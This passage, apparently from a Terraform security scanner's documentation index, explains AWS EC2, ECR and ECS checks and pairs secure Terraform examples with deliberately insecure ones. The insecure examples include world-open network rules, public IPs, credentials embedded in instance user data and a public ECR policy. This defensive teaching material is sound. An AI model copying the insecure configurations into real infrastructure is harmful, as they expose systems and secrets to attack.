Example"},{"location":"checks/aws/ec2/enforce-launch-config-http-token-imds/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options</p> </li> <li> <p>https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/no-default-vpc/","text":"","title":"AWS best practice to not use the default VPC for workflows"},{"location":"checks/aws/ec2/no-default-vpc/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/ec2/no-default-vpc/#explanation","text":"<p>Default VPC does not have a lot of the critical security features that standard VPC comes with, new resources should not be created in the default VPC and it should not be present in the Terraform.</p>","title":"Explanation"},{"location":"checks/aws/ec2/no-default-vpc/#possible-impact","text":"<p>The default VPC does not have critical security features applied</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/no-default-vpc/#suggested-resolution","text":"<p>Create a non-default vpc for resources to be created in</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/no-default-vpc/#insecure-example","text":"<p>The following example will fail the aws-ec2-no-default-vpc check. <pre><code> resource \"aws_default_vpc\" \"default\" {\n    tags = {\n      Name = \"Default VPC\"\n    }\n   }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/no-default-vpc/#secure-example","text":"<p>The following example will pass the aws-ec2-no-default-vpc check. <pre><code> # no aws default vpc present\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/no-default-vpc/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/default_vpc</p> </li> <li> <p>https://docs.aws.amazon.com/vpc/latest/userguide/default-vpc.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/no-excessive-port-access/","text":"","title":"An ingress Network ACL rule allows ALL ports."},{"location":"checks/aws/ec2/no-excessive-port-access/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/ec2/no-excessive-port-access/#explanation","text":"<p>Ensure access to specific required ports is allowed, and nothing else.</p>","title":"Explanation"},{"location":"checks/aws/ec2/no-excessive-port-access/#possible-impact","text":"<p>All ports exposed for egressing data</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/no-excessive-port-access/#suggested-resolution","text":"<p>Set specific allowed ports</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/no-excessive-port-access/#insecure-example","text":"<p>The following example will fail the aws-ec2-no-excessive-port-access check. <pre><code> resource \"aws_network_acl_rule\" \"bad_example\" {\n   egress         = false\n   protocol       = \"all\"\n   rule_action    = \"allow\"\n   cidr_block     = \"0.0.0.0/0\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/no-excessive-port-access/#secure-example","text":"<p>The following example will pass the aws-ec2-no-excessive-port-access check. <pre><code> resource \"aws_network_acl_rule\" \"good_example\" {\n   egress         = false\n   protocol       = \"tcp\"\n   from_port      = 22\n   to_port        = 22\n   rule_action    = \"allow\"\n   cidr_block     = \"0.0.0.0/0\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/no-excessive-port-access/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#to_port</p> </li> <li> <p>https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/no-public-egress-sgr/","text":"","title":"An egress security group rule allows traffic to /0."},{"location":"checks/aws/ec2/no-public-egress-sgr/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/ec2/no-public-egress-sgr/#explanation","text":"<p>Opening up ports to connect out to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that are explicitly required where possible.</p>","title":"Explanation"},{"location":"checks/aws/ec2/no-public-egress-sgr/#possible-impact","text":"<p>Your port is egressing data to the internet</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/no-public-egress-sgr/#suggested-resolution","text":"<p>Set a more restrictive cidr range</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/no-public-egress-sgr/#insecure-example","text":"<p>The following example will fail the aws-ec2-no-public-egress-sgr check. <pre><code> resource \"aws_security_group\" \"bad_example\" {\n    egress {\n        cidr_blocks = [\"0.0.0.0/0\"]\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/no-public-egress-sgr/#secure-example","text":"<p>The following example will pass the aws-ec2-no-public-egress-sgr check. <pre><code> resource \"aws_security_group\" \"good_example\" {\n    egress {\n        cidr_blocks = [\"1.2.3.4/32\"]\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/no-public-egress-sgr/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group</p> </li> <li> <p>https://docs.aws.amazon.com/whitepapers/latest/building-scalable-secure-multi-vpc-network-infrastructure/centralized-egress-to-internet.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/no-public-ingress-acl/","text":"","title":"An ingress Network ACL rule allows specific ports from /0."},{"location":"checks/aws/ec2/no-public-ingress-acl/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/ec2/no-public-ingress-acl/#explanation","text":"<p>Opening up ACLs to the public internet is potentially dangerous. You should restrict access to IP addresses or ranges that explicitly require it where possible.</p>","title":"Explanation"},{"location":"checks/aws/ec2/no-public-ingress-acl/#possible-impact","text":"<p>The ports are exposed for ingressing data to the internet</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/no-public-ingress-acl/#suggested-resolution","text":"<p>Set a more restrictive cidr range</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/no-public-ingress-acl/#insecure-example","text":"<p>The following example will fail the aws-ec2-no-public-ingress-acl check. <pre><code> resource \"aws_network_acl_rule\" \"bad_example\" {\n   egress         = false\n   protocol       = \"tcp\"\n   from_port      = 22\n   to_port        = 22\n   rule_action    = \"allow\"\n   cidr_block     = \"0.0.0.0/0\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/no-public-ingress-acl/#secure-example","text":"<p>The following example will pass the aws-ec2-no-public-ingress-acl check. <pre><code> resource \"aws_network_acl_rule\" \"good_example\" {\n   egress         = false\n   protocol       = \"tcp\"\n   from_port      = 22\n   to_port        = 22\n   rule_action    = \"allow\"\n   cidr_block     = \"10.0.0.0/16\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/no-public-ingress-acl/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#cidr_block</p> </li> <li> <p>https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/no-public-ingress-sgr/","text":"","title":"An ingress security group rule allows traffic from /0."},{"location":"checks/aws/ec2/no-public-ingress-sgr/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/ec2/no-public-ingress-sgr/#explanation","text":"<p>Opening up ports to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that explicitly require it where possible.</p>","title":"Explanation"},{"location":"checks/aws/ec2/no-public-ingress-sgr/#possible-impact","text":"<p>Your port exposed to the internet</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/no-public-ingress-sgr/#suggested-resolution","text":"<p>Set a more restrictive cidr range</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/no-public-ingress-sgr/#insecure-example","text":"<p>The following example will fail the aws-ec2-no-public-ingress-sgr check. <pre><code> resource \"aws_security_group_rule\" \"bad_example\" {\n    type = \"ingress\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/no-public-ingress-sgr/#secure-example","text":"<p>The following example will pass the aws-ec2-no-public-ingress-sgr check. <pre><code> resource \"aws_security_group_rule\" \"good_example\" {\n    type = \"ingress\"\n    cidr_blocks = [\"10.0.0.0/16\"]\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/no-public-ingress-sgr/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule#cidr_blocks</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/security-group-rules-reference.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/no-public-ip/","text":"","title":"Launch configuration should not have a public IP address."},{"location":"checks/aws/ec2/no-public-ip/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/ec2/no-public-ip/#explanation","text":"<p>You should limit the provision of public IP addresses for resources. Resources should not be exposed on the public internet, but should have access limited to consumers required for the function of your application.</p>","title":"Explanation"},{"location":"checks/aws/ec2/no-public-ip/#possible-impact","text":"<p>The instance or configuration is publicly accessible</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/no-public-ip/#suggested-resolution","text":"<p>Set the instance to not be publicly accessible</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/no-public-ip/#insecure-example","text":"<p>The following example will fail the aws-ec2-no-public-ip check. <pre><code> resource \"aws_launch_configuration\" \"bad_example\" {\n    associate_public_ip_address = true\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/no-public-ip/#secure-example","text":"<p>The following example will pass the aws-ec2-no-public-ip check. <pre><code> resource \"aws_launch_configuration\" \"good_example\" {\n    associate_public_ip_address = false\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/no-public-ip/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#associate_public_ip_address</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#associate_public_ip_address</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/no-public-ip-subnet/","text":"","title":"Instances in a subnet should not receive a public IP address by default."},{"location":"checks/aws/ec2/no-public-ip-subnet/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/ec2/no-public-ip-subnet/#explanation","text":"<p>You should limit the provision of public IP addresses for resources. Resources should not be exposed on the public internet, but should have access limited to consumers required for the function of your application.</p>","title":"Explanation"},{"location":"checks/aws/ec2/no-public-ip-subnet/#possible-impact","text":"<p>The instance is publicly accessible</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/no-public-ip-subnet/#suggested-resolution","text":"<p>Set the instance to not be publicly accessible</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/no-public-ip-subnet/#insecure-example","text":"<p>The following example will fail the aws-ec2-no-public-ip-subnet check. <pre><code> resource \"aws_subnet\" \"bad_example\" {\n    vpc_id                  = \"vpc-123456\"\n    map_public_ip_on_launch = true\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/no-public-ip-subnet/#secure-example","text":"<p>The following example will pass the aws-ec2-no-public-ip-subnet check. <pre><code> resource \"aws_subnet\" \"good_example\" {\n    vpc_id                  = \"vpc-123456\"\n    map_public_ip_on_launch = false\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/no-public-ip-subnet/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/subnet#map_public_ip_on_launch</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html#concepts-public-addresses</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/no-secrets-in-launch-template-user-data/","text":"","title":"User data for EC2 instances must not contain sensitive AWS keys"},{"location":"checks/aws/ec2/no-secrets-in-launch-template-user-data/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/ec2/no-secrets-in-launch-template-user-data/#explanation","text":"<p>EC2 instance data is used to pass start up information into the EC2 instance. This userdata must not contain access key credentials. Instead use an IAM Instance Profile assigned to the instance to grant access to other AWS Services.</p>","title":"Explanation"},{"location":"checks/aws/ec2/no-secrets-in-launch-template-user-data/#possible-impact","text":"<p>User data is visible through the AWS Management console</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/no-secrets-in-launch-template-user-data/#suggested-resolution","text":"<p>Remove sensitive data from the EC2 instance user-data generated by launch templates</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/no-secrets-in-launch-template-user-data/#insecure-example","text":"<p>The following example will fail the aws-ec2-no-secrets-in-launch-template-user-data check. <pre><code> resource \"aws_launch_template\" \"bad_example\" {\n\n     image_id      = \"ami-12345667\"\n     instance_type = \"t2.small\"\n\n     user_data = &lt;&lt;EOF\n export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n export AWS_DEFAULT_REGION=us-west-2 \nEOF\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/no-secrets-in-launch-template-user-data/#secure-example","text":"<p>The following example will pass the aws-ec2-no-secrets-in-launch-template-user-data check. <pre><code> resource \"aws_iam_instance_profile\" \"good_example\" {\n         // ...\n }\n\n resource \"aws_launch_template\" \"good_example\" {\n     image_id      = \"ami-12345667\"\n     instance_type = \"t2.small\"\n\n     iam_instance_profile {\n         name = aws_iam_instance_profile.good_profile.arn\n     }\n     user_data = &lt;&lt;EOF\n     export GREETING=hello\nEOF\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/no-secrets-in-launch-template-user-data/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/no-secrets-in-user-data/","text":"","title":"User data for EC2 instances must not contain sensitive AWS keys"},{"location":"checks/aws/ec2/no-secrets-in-user-data/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/ec2/no-secrets-in-user-data/#explanation","text":"<p>EC2 instance data is used to pass start up information into the EC2 instance. This userdata must not contain access key credentials. Instead use an IAM Instance Profile assigned to the instance to grant access to other AWS Services.</p>","title":"Explanation"},{"location":"checks/aws/ec2/no-secrets-in-user-data/#possible-impact","text":"<p>User data is visible through the AWS Management console</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/no-secrets-in-user-data/#suggested-resolution","text":"<p>Remove sensitive data from the EC2 instance user-data</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/no-secrets-in-user-data/#insecure-example","text":"<p>The following example will fail the aws-ec2-no-secrets-in-user-data check. <pre><code> resource \"aws_instance\" \"bad_example\" {\n\n     ami           = \"ami-12345667\"\n     instance_type = \"t2.small\"\n\n     user_data = &lt;&lt;EOF\n export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n export AWS_DEFAULT_REGION=us-west-2 \n EOF\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/no-secrets-in-user-data/#secure-example","text":"<p>The following example will pass the aws-ec2-no-secrets-in-user-data check. <pre><code> resource \"aws_iam_instance_profile\" \"good_example\" {\n         // ...\n }\n\n resource \"aws_instance\" \"good_example\" {\n     ami           = \"ami-12345667\"\n     instance_type = \"t2.small\"\n\n     iam_instance_profile = aws_iam_instance_profile.good_profile.arn\n\n     user_data = &lt;&lt;EOF\n     export GREETING=hello\n EOF\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/no-secrets-in-user-data/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/no-sensitive-info/","text":"","title":"Ensure all data stored in the launch configuration EBS is securely encrypted"},{"location":"checks/aws/ec2/no-sensitive-info/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/ec2/no-sensitive-info/#explanation","text":"<p>When creating Launch Configurations, user data can be used for the initial configuration of the instance. User data must not contain any sensitive data.</p>","title":"Explanation"},{"location":"checks/aws/ec2/no-sensitive-info/#possible-impact","text":"<p>Sensitive credentials in user data can be leaked</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/no-sensitive-info/#suggested-resolution","text":"<p>Don't use sensitive data in user data</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/no-sensitive-info/#insecure-example","text":"<p>The following example will fail the aws-ec2-no-sensitive-info check. <pre><code> resource \"aws_launch_configuration\" \"as_conf\" {\n   name          = \"web_config\"\n   image_id      = data.aws_ami.ubuntu.id\n   instance_type = \"t2.micro\"\n   user_data     = &lt;&lt;EOF\n export DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n EOF\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/no-sensitive-info/#secure-example","text":"<p>The following example will pass the aws-ec2-no-sensitive-info check. <pre><code> resource \"aws_launch_configuration\" \"as_conf\" {\n   name          = \"web_config\"\n   image_id      = data.aws_ami.ubuntu.id\n   instance_type = \"t2.micro\"\n   user_data     = &lt;&lt;EOF\n export GREETING=\"Hello there\"\n EOF\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/no-sensitive-info/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#user_data,user_data_base64</li> </ul>","title":"Links"},{"location":"checks/aws/ec2/volume-encryption-customer-key/","text":"","title":"EBS volume encryption should use Customer Managed Keys"},{"location":"checks/aws/ec2/volume-encryption-customer-key/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/ec2/volume-encryption-customer-key/#explanation","text":"<p>Encryption using AWS keys provides protection for your EBS volume. To increase control of the encryption and manage factors like rotation use customer managed keys.</p>","title":"Explanation"},{"location":"checks/aws/ec2/volume-encryption-customer-key/#possible-impact","text":"<p>Using AWS managed keys does not allow for fine grained control</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/volume-encryption-customer-key/#suggested-resolution","text":"<p>Enable encryption using customer managed keys</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/volume-encryption-customer-key/#insecure-example","text":"<p>The following example will fail the aws-ec2-volume-encryption-customer-key check. <pre><code> resource \"aws_ebs_volume\" \"example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n\n   tags = {\n     Name = \"HelloWorld\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/volume-encryption-customer-key/#secure-example","text":"<p>The following example will pass the aws-ec2-volume-encryption-customer-key check. <pre><code> resource \"aws_kms_key\" \"ebs_encryption\" {\n    enable_key_rotation = true\n }\n\n resource \"aws_ebs_volume\" \"example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n\n   kms_key_id = aws_kms_key.ebs_encryption.arn\n\n   tags = {\n     Name = \"HelloWorld\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/volume-encryption-customer-key/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#kms_key_id</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ecr/","text":"","title":"ecr"},{"location":"checks/aws/ecr/#checks","text":"<ul> <li> <p>enable-image-scans ECR repository has image scans disabled.</p> </li> <li> <p>enforce-immutable-repository ECR images tags shouldn't be mutable.</p> </li> <li> <p>no-public-access ECR repository policy must block public access</p> </li> <li> <p>repository-customer-key ECR Repository should use customer managed keys to allow more control</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/ecr/enable-image-scans/","text":"","title":"ECR repository has image scans disabled."},{"location":"checks/aws/ecr/enable-image-scans/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/ecr/enable-image-scans/#explanation","text":"<p>Repository image scans should be enabled to ensure vulnerable software can be discovered and remediated as soon as possible.</p>","title":"Explanation"},{"location":"checks/aws/ecr/enable-image-scans/#possible-impact","text":"<p>The ability to scan images is not being used and vulnerabilities will not be highlighted</p>","title":"Possible Impact"},{"location":"checks/aws/ecr/enable-image-scans/#suggested-resolution","text":"<p>Enable ECR image scanning</p>","title":"Suggested Resolution"},{"location":"checks/aws/ecr/enable-image-scans/#insecure-example","text":"<p>The following example will fail the aws-ecr-enable-image-scans check. <pre><code> resource \"aws_ecr_repository\" \"bad_example\" {\n   name                 = \"bar\"\n   image_tag_mutability = \"MUTABLE\"\n\n   image_scanning_configuration {\n     scan_on_push = false\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ecr/enable-image-scans/#secure-example","text":"<p>The following example will pass the aws-ecr-enable-image-scans check. <pre><code> resource \"aws_ecr_repository\" \"good_example\" {\n   name                 = \"bar\"\n   image_tag_mutability = \"MUTABLE\"\n\n   image_scanning_configuration {\n     scan_on_push = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ecr/enable-image-scans/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#image_scanning_configuration</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-scanning.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ecr/enforce-immutable-repository/","text":"","title":"ECR images tags shouldn't be mutable."},{"location":"checks/aws/ecr/enforce-immutable-repository/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/ecr/enforce-immutable-repository/#explanation","text":"<p>ECR images should be set to IMMUTABLE to prevent code injection through image mutation.</p> <p>This can be done by setting <code>image_tab_mutability</code> to <code>IMMUTABLE</code></p>","title":"Explanation"},{"location":"checks/aws/ecr/enforce-immutable-repository/#possible-impact","text":"<p>Image tags could be overwritten with compromised images</p>","title":"Possible Impact"},{"location":"checks/aws/ecr/enforce-immutable-repository/#suggested-resolution","text":"<p>Only use immutable images in ECR</p>","title":"Suggested Resolution"},{"location":"checks/aws/ecr/enforce-immutable-repository/#insecure-example","text":"<p>The following example will fail the aws-ecr-enforce-immutable-repository check. <pre><code> resource \"aws_ecr_repository\" \"bad_example\" {\n   name                 = \"bar\"\n   image_tag_mutability = \"MUTABLE\"\n\n   image_scanning_configuration {\n     scan_on_push = true\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ecr/enforce-immutable-repository/#secure-example","text":"<p>The following example will pass the aws-ecr-enforce-immutable-repository check. <pre><code> resource \"aws_ecr_repository\" \"good_example\" {\n   name                 = \"bar\"\n   image_tag_mutability = \"IMMUTABLE\"\n\n   image_scanning_configuration {\n     scan_on_push = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ecr/enforce-immutable-repository/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository</p> </li> <li> <p>https://sysdig.com/blog/toctou-tag-mutability/</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ecr/no-public-access/","text":"","title":"ECR repository policy must block public access"},{"location":"checks/aws/ecr/no-public-access/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/ecr/no-public-access/#explanation","text":"<p>Allowing public access to the ECR repository risks leaking sensitive of abusable information</p>","title":"Explanation"},{"location":"checks/aws/ecr/no-public-access/#possible-impact","text":"<p>Risk of potential data leakage of sensitive artifacts</p>","title":"Possible Impact"},{"location":"checks/aws/ecr/no-public-access/#suggested-resolution","text":"<p>Do not allow public access in the policy</p>","title":"Suggested Resolution"},{"location":"checks/aws/ecr/no-public-access/#insecure-example","text":"<p>The following example will fail the aws-ecr-no-public-access check. <pre><code> resource \"aws_ecr_repository\" \"foo\" {\n   name = \"bar\"\n }\n\n resource \"aws_ecr_repository_policy\" \"foopolicy\" {\n   repository = aws_ecr_repository.foo.name\n\n   policy = &lt;&lt;EOF\n {\n     \"Version\": \"2008-10-17\",\n     \"Statement\": [\n         {\n             \"Sid\": \"new policy\",\n             \"Effect\": \"Allow\",\n             \"Principal\": \"*\",\n             \"Action\": [\n                 \"ecr:GetDownloadUrlForLayer\",\n                 \"ecr:BatchGetImage\",\n                 \"ecr:BatchCheckLayerAvailability\",\n                 \"ecr:PutImage\",\n                 \"ecr:InitiateLayerUpload\",\n                 \"ecr:UploadLayerPart\",\n                 \"ecr:CompleteLayerUpload\",\n                 \"ecr:DescribeRepositories\",\n                 \"ecr:GetRepositoryPolicy\",\n                 \"ecr:ListImages\",\n                 \"ecr:DeleteRepository\",\n                 \"ecr:BatchDeleteImage\",\n                 \"ecr:SetRepositoryPolicy\",\n                 \"ecr:DeleteRepositoryPolicy\"\n             ]\n         }\n     ]\n }\n EOF\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ecr/no-public-access/#secure-example","text":"<p>The following example will pass the aws-ecr-no-public-access check. <pre><code> resource \"aws_ecr_repository\" \"foo\" {\n   name = \"bar\"\n }\n\n resource \"aws_ecr_repository_policy\" \"foopolicy\" {\n   repository = aws_ecr_repository.foo.name\n\n   policy = &lt;&lt;EOF\n {\n     \"Version\": \"2008-10-17\",\n     \"Statement\": [\n         {\n             \"Sid\": \"new policy\",\n             \"Effect\": \"Allow\",\n             \"Principal\": \"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\",\n             \"Action\": [\n                 \"ecr:GetDownloadUrlForLayer\",\n                 \"ecr:BatchGetImage\",\n                 \"ecr:BatchCheckLayerAvailability\",\n                 \"ecr:PutImage\",\n                 \"ecr:InitiateLayerUpload\",\n                 \"ecr:UploadLayerPart\",\n                 \"ecr:CompleteLayerUpload\",\n                 \"ecr:DescribeRepositories\",\n                 \"ecr:GetRepositoryPolicy\",\n                 \"ecr:ListImages\",\n                 \"ecr:DeleteRepository\",\n                 \"ecr:BatchDeleteImage\",\n                 \"ecr:SetRepositoryPolicy\",\n                 \"ecr:DeleteRepositoryPolicy\"\n             ]\n         }\n     ]\n }\n EOF\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ecr/no-public-access/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository_policy#policy</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonECR/latest/public/public-repository-policies.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ecr/repository-customer-key/","text":"","title":"ECR Repository should use customer managed keys to allow more control"},{"location":"checks/aws/ecr/repository-customer-key/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/ecr/repository-customer-key/#explanation","text":"<p>Images in the ECR repository are encrypted by default using AWS managed encryption keys. To increase control of the encryption and control the management of factors like key rotation, use a Customer Managed Key.</p>","title":"Explanation"},{"location":"checks/aws/ecr/repository-customer-key/#possible-impact","text":"<p>Using AWS managed keys does not allow for fine grained control</p>","title":"Possible Impact"},{"location":"checks/aws/ecr/repository-customer-key/#suggested-resolution","text":"<p>Use customer managed keys</p>","title":"Suggested Resolution"},{"location":"checks/aws/ecr/repository-customer-key/#insecure-example","text":"<p>The following example will fail the aws-ecr-repository-customer-key check. <pre><code> resource \"aws_ecr_repository\" \"bad_example\" {\n    name                 = \"bar\"\n    image_tag_mutability = \"MUTABLE\"\n\n    image_scanning_configuration {\n      scan_on_push = true\n    }\n   }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ecr/repository-customer-key/#secure-example","text":"<p>The following example will pass the aws-ecr-repository-customer-key check. <pre><code> resource \"aws_kms_key\" \"ecr_kms\" {\n    enable_key_rotation = true\n }\n\n resource \"aws_ecr_repository\" \"good_example\" {\n    name                 = \"bar\"\n    image_tag_mutability = \"MUTABLE\"\n\n    image_scanning_configuration {\n      scan_on_push = true\n    }\n\n    encryption_configuration {\n        encryption_type = \"KMS\"\n        kms_key = aws_kms_key.ecr_kms.key_id\n    }\n   }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ecr/repository-customer-key/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#encryption_configuration</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonECR/latest/userguide/encryption-at-rest.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ecs/","text":"","title":"ecs"},{"location":"checks/aws/ecs/#checks","text":"<ul> <li> <p>enable-container-insight ECS clusters should have container insights enabled</p> </li> <li> <p>enable-in-transit-encryption ECS Task Definitions with EFS volumes should use in-transit encryption</p> </li> <li> <p>no-plaintext-secrets Task definition defines sensitive environment variable(s).</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/ecs/enable-container-insight/","text":"","title":"ECS clusters should have container insights enabled"},{"location":"checks/aws/ecs/enable-container-insight/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/ecs/enable-container-insight/#explanation","text":"<p>Cloudwatch Container Insights provide more metrics and logs for container based applications and micro services.</p>","title":"Explanation"},{"location":"checks/aws/ecs/enable-container-insight/#possible-impact","text":"<p>Not all metrics and logs may be gathered for containers when Container Insights isn't enabled</p>","title":"Possible Impact"},{"location":"checks/aws/ecs/enable-container-insight/#suggested-resolution","text":"<p>Enable Container Insights</p>","title":"Suggested Resolution"},{"location":"checks/aws/ecs/enable-container-insight/#insecure-example","text":"<p>The following example will fail the aws-ecs-enable-container-insight check. <pre><code> resource \"aws_ecs_cluster\" 